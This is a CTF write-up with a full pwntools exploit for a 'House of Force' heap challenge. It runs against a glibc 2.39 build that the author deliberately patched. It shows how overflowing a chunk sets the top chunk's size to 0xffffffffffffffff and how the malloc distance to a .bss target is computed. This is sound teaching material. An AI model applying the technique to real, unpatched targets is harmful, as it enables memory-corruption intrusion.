---
title: "House of Force — Reviving the Classic Top Chunk Exploitation on glibc 2.39"
ctf: "NOPs"
category: "pwn"
difficulty: "easy"
points: null
date: "2026-06-19"
lat: -300.71
lng: 1100
summary: "Reversing a custom-patched libc to bypass modern security controls, corrupting the top chunk size metadata to infinity, and calculating the chunk2mem offset to achieve an arbitrary malloc allocation."
tags:
  - "heap"
  - "top-chunk"
  - "house-of-force"
  - "libc-patching"
  - "glibc-2.39"
  - "radiff2"
---

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./house_of_force")
libc= ELF("./libc.so.6")
ld  = ELF("./ld.so.2") 

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

def main():
    global r
    r = conn()
    # good luck pwning :)
```
```text
Let's talk about House of Force on glibc version 2.39. Yes, you read that correctly!
This technique was patched back in glibc 2.29 with a single check that made it
unusable. However, I patched it out by changing the jump instruction (jb) to NOPs.
This allows me to demonstrate the attack on a modern version like 2.39. 

This scenario makes for a great CTF challenge. It forces players to look beyond just
the version number and actually reverse-engineer the libc. An author can bring an old
technique back to life with a single 0x90 byte. You might think you have to guess the
changes, but you can simply use radiff2 to compare the original glibc 2.39 with the
one provided by the challenge. By looking at the differences, you can list the
modified offsets, see what changed (like NOPs or new instructions), and identify
exactly which checks the author removed. 

Either way, our goal here is to learn this specific technique, not to dive into how
to create CTF tracks. In CTF challenges, we focus on demonstrating real bugs to show
why a challenge is high quality.

To keep things simple, I made the challenge give us a leak and automatically allocate
a 0x80 chunk (chunk A) for us instead of creating a full menu. We only need three
chunks at most to make this technique work and give us an arbitrary malloc anywhere,
allowing us to read or write to that address.

First, let's grab the leaks.
```
```python
    r.recvuntil(b"chunk at: ")
    chunkA = int(r.recvline().strip(),16)

    r.recvuntil(b"at: ")
    bss = int(r.recvline().strip(),16)

    top = chunkA + 0x90

    log.success(f"LEAK:\nchunkA:{hex(chunkA)}\ntarget:{hex(bss)}\ntop:{hex(top)}\n")
```
```text
    Now we have everything we need, including all the leaks. We can calculate the top 
    chunk address from chunk A since the heap layout looks like this:

    [=========== chunk A ===========][=========== top ===========]
    Low Address                      |              High Address
    |                                |
    V                                V
    chunkA_address + size(chunkA) = top_chunk_address

    We have an overflow vulnerability here, so we can fill chunk A to corrupt the
    metadata of the top chunk, specifically its previous size and size fields:

    [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA][AAAAAAAA === top ==========]
                                     
                                     prev_size(top) = A * 8
                                     size(top)      = unchanged (or the lowest byte
                                     is 0x0a/0x00, depending on how the challenge
                                     reads the input)

    We need to corrupt the size field to a very large integer. Why? Because if we
    make glibc believe that all higher addresses belong to the top chunk, we can
    force the top chunk to point to any address above it. Of course, that target 
    address must have at least read permissions.

    By setting size(top) = 0xffffffffffffffff, the heap allocator will believe it has
    infinite space:

    [=========== chunk A ===========][=========== top ===========]--> (Infinity)

    Let's set it up!
```
```python
    payload = b"\x00"*0x80 + p64(0) + p64(0xffffffffffffffff)
```
```text
   You might ask how many bytes we need to write into chunk A. To overflow by 16 
   (0x10) bytes, we must write a total of 144 (0x80 + 0x10) bytes.
```
```python
    r.sendlineafter(b"chunk: ",str(0x90).encode())
    r.sendafter(b"Data: ",payload)
```
```text
    We are almost done. Now, we just need to move the top chunk's address to our 
    target address. 

    Imagine if we allocate chunk B with a size of 0x100. The layout becomes:

    [===== chunk A =====][====== chunk B =====][====== top =======]--> 

    Since the top chunk was located at the start of chunk B before the allocation, 
    the new target address for the top chunk depends entirely on the size we request
    for chunk B. 

    If we want the top chunk to point directly to a specific address—like the .bss
    section—what size should we choose for chunk B to bridge that exact distance?
    This reminds me of the very first physics lesson in high school about distance 
    and acceleration graphs!

    [======== chunk A =======][======== top ========-->   ...   [.bss section]
                                                                |
                                                                V
                                             Distance to bridge = size(chunk B)

    The formula is simple:
    size(chunk B) = target_bss_address - current_top_chunk_address

    Let's calculate this value, make the allocation, and see exactly where the top chunk points afterward!
```    
```python
    #size = bss - top 
    size = bss - top - 0x10
    r.sendlineafter(b"malloc: ",str(size).encode())
```
```text
    We are incredibly close! The top chunk should be at 0x3df4000,
    but it is currently at 0x3df4010. Where did this extra 0x10 byte offset come 
    from? I know a quick fix is to just subtract 0x10, but I want to understand why 
    it happens. Is it because of the header metadata and how the user pointer is
    calculated? Fuck even though I didn't want to check the glibc source code, I think I
    have to take a look o_O.

    Looking at the glibc source, we see:
    chunk2mem(chunk) = chunk + 0x10  

    This macro adds 0x10 to the chunk header address to return the user data pointer.
    Since we calculated our distance using "target_address - top_chunk_address", and 
    the top chunk pointer tracks the chunk header rather than the user data area, we
    need to adjust our math to account for this 0x10-byte difference.

    After adjusting the size and calling malloc(size), the top chunk successfully
    moves to our target destination of 0x3df4000. The next allocation malloc(0x20)
    returns exactly that address:

    0x3df3ff0:     0x0000000000000000      0x0000000000000031
    0x3df4000:     0x65736f6c20756f59      0x0000000000000a21

    This is exactly how the House of Force works. From this point, you have control 
    over the target memory address, and there are many paths you can take to achieve 
    code execution.
```
```python
    r.send(b"WIN"*3)

    r.interactive()
   
if __name__ == "__main__":
    main()
```